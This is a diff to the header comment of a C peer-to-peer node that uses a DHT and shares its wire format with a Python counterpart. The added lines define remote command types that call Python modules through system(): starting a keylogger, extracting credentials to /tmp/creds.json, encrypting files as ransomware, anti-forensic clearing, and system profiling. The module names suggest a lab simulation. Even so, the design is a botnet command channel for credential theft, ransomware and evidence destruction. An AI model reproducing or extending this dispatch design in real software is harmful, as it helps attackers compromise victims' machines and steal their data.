@@ -32,7 +32,13 @@
  *      STORE receive and FIND_VALUE return
  *    + Quorum-based FIND_VALUE: collect QUORUM responses; g_select picks best
  *    + Periodic re-bootstrap thread: FIND_NODE on own ID every BOOTSTRAP_SEC
- *
+ * New command types (all delegate to Python modules via system()): */
+/* "start_keylogger"   → system("python3 keylogger_sim.py --start &"); */
+/* "stop_keylogger"    → system("python3 keylogger_sim.py --stop");    */
+/* "extract_creds"     → system("python3 cred_extractor_sim.py --extract > /tmp/creds.json"); */
+/* "ransom_encrypt"    → system("python3 ransomware_sim.py --setup && python3 ransomware_sim.py --encrypt"); */
+/* "anti_forensics"    → system("python3 anti_forensics_sim.py --clear-lab"); */
+/* "system_profile"    → system("python3 system_profiler.py --collect > /tmp/profile.json"); 
  *  Wire format (shared with p2p_node.py):
  *    HDR [35 bytes]: [1 type][8 msg_id][20 sender_id][4 ip NBO][2 port NBO]
  *    ADD_PROVIDER  (0x0A): HDR + [20 key]
